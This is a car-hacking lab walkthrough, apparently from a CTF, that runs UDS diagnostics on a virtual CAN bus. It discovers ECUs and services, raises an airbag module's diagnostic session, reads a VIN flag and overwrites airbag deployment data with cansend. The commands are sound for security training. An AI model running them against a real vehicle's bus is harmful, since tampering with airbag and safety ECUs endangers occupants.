Perform an initial discovery with caring caribou $python3 cc.py uds discovery

Discovery give us the following identified diagnostics:

+------------+------------+ | CLIENT ID | SERVER ID | +------------+------------+ | 0x00000620 | 0x00000520 | | 0x00000622 | 0x00000522 | | 0x0000062c | 0x0000052c | | 0x000007e0 | 0x000007e8 | | 0x000007e2 | 0x000007ea | | 0x000007f1 | 0x000007f9 | +------------+------------+

Next we can look up available services for each of the available modules shown in the list above

As an example for this recon walkthrough we will follow up only on the last module from the list 0x7f1 and we perform a discovery of services

$python3 cc.py uds services 0x7f1 0x7f9

Supported service 0x10: DIAGNOSTIC_SESSION_CONTROL Supported service 0x11: ECU_RESET Supported service 0x22: READ_DATA_BY_IDENTIFIER Supported service 0x27: SECURITY_ACCESS Supported service 0x2e: WRITE_DATA_BY_IDENTIFIER Supported service 0x3e: TESTER_PRESENT

Next we can perform a discovery of subfunctions on 0x22 READ_DATA and also on 0x2e WRITE_DATA, the rest of the services are standard and respond as defined for UDS

$python3 cc.py dcm subfunc 0x7f1 0x7f9 0x22 2 3 Sub-function 11 11 Sub-function f1 90 Sub-function fa 00 Sub-function fa 01 Sub-function fa 02 Sub-function fa 06

From the list above we can see the subfunctions FA 00 to FA 06 which are subfunctions reserved for Airbag Deployment Data (see reference below) https://piembsystech.com/data-identifiers-did-of-uds-protocol-iso-14229/

Once we have a list of subfunctions we could read the data out and also we could write data in

Keeping in mind that this is an airbag module before reading or writing is permitted the diagnostic session should be raise from default session 0x01 to Safety system Diagnostic system session 0x04 $cansend vcan0 7f1#021004 50 04 00 FF 00 FF

We get a positive response of the session changed and we can now execute a subfunction discovery on 0x2e WRITE_DATA service $python3 cc.py dcm subfunc 0x7f1 0x7f9 0x2e 2 3 Sub-function 11 11 Sub-function f1 90 Sub-function fa 00 Sub-function fa 01 Sub-function fa 02 Sub-function fa 06

now let's read the VIN number as we already know the subfunction F1 90 has been identified as available as part of 0x22 service in a seperate terminal run the isotprecv command $isotprecv vcan0 -s 7f1 -d 7f9

$cansend vcan0 7f1#0322f190 response: 62 F1 90 01 31 46 4C 41 47 56 49 4E 53 52 53 34 32 30 36 39 30

we convert the hex to ascii $echo "31464c414756494e535253343230363930" | xxd -r -p 1FLAGVINSRS420690

we should be able to read and write as well, let's try it with subfunction FA 06 we read it first $cansend vcan0 7f1#0322fa06 62 FA 06 01 01 01

Let's now try to write data $cansend vcan0 7f1#062efa06000000 6E FA 06

and read it again to verify $cansend vcan0 7f1#0322fa06 62 FA 06 00 00 00

Success

![image](https://github.com/IvanGranero/car-hacking/assets/47937620/015899a5-38f1-46a2-bdb7-428555ff6f9f)

This walkthrough only traverses one of the many possible paths to do recon on the different modules and services available for a complete recon all the remaining modules and services within the modules plus subfuntions would have to be discovered and played with.

Just to give another quick example if we do a service discovery on module 7e0: Supported service 0x01: Unknown service Supported service 0x04: Unknown service Supported service 0x09: Unknown service Supported service 0x10: DIAGNOSTIC_SESSION_CONTROL Supported service 0x11: ECU_RESET Supported service 0x22: READ_DATA_BY_IDENTIFIER Supported service 0x23: READ_MEMORY_BY_ADDRESS Supported service 0x27: SECURITY_ACCESS Supported service 0x28: COMMUNICATION_CONTROL Supported service 0x2e: WRITE_DATA_BY_IDENTIFIER Supported service 0x2f: INPUT_OUTPUT_CONTROL_BY_IDENTIFIER Supported service 0x3e: TESTER_PRESENT Supported service 0xba: Unknown service

with the above information we can either do a dump_dids o subfunction search, the 0x2f would be a very interesting service to play with. as a hint this module also contains a flag by reading the VIN. Have fun!
